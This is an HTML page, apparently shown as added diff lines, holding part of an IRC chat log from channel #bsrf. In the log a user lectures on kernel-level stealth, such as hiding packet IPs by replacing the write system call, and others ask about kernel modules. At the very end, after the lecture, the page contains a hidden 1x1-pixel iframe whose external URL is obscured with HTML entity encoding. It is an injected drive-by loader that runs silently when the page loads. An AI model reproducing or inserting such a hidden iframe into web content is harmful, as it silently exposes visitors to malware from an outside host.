+<BR>&lt;unknown> and remove it from the stream
+<BR>*** insulted has joined #bsrf
+<BR>&lt;unknown> This method
+<BR>&lt;insulted> hi
+<BR>&lt;unknown> can work without open connection
+<BR>&lt;Dustin> ./mode #bsrf +m
+<BR>&lt;unknown> because it will be removed from the stream anyway
+<BR>*** wascy is now known as wascy|at|work|even|s
+<BR>&lt;}{exadecimal> gtg, send me a log
+<BR>&lt;unknown> you can hide the ip of these packets by replacing the
+write system call
+<BR>&lt;Mikkkeee> log will be on the bsrf site
+<BR>&lt;Neophyte> 5-1
+<BR>*** SpiderMan sets mode: +m
+<BR>&lt;unknown> OK that it for now if got questions about the source
+<BR>&lt;unknown> ask
+<BR>*** SpiderMan sets mode: -m
+<BR>&lt;snider> i have a kernel too old to load that helloworld module..
+how can the system see that its been written for a newer kernel version
+(even when it's as simple as helloworld.c)?
+<BR>&lt;snider> thats my only question
+<BR>&lt;Dustin> it uses a call not implemented in older kernels?
+<BR>*** CoolMoDee has joined #bsrf
+<BR>&lt;unknown> What is the messages?
+<BR>&lt;unknown> What is the message?
+<BR>&lt;snider> that the module was compiled for.. oh wait.. i replaced
+my kernel src with the 2.4.7 one a while back
+<BR>&lt;Mikkkeee> unknown would this work for bsd boxes?
+<BR>&lt;snider> hehe.. nevermind
+<BR>*** Saito has joined #bsrf
+<BR>&lt;unknown> OK so you understood every thing?
+<BR>&lt;unknown> I didnt try but i shouldnt be hard
+<BR>*** BooTERROR has joined #bsrf
+<BR>&lt;snider> okay, so the lecture is at end=
+<BR>&lt;unknown> Well yes
+<BR>--- End of Lecture---
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
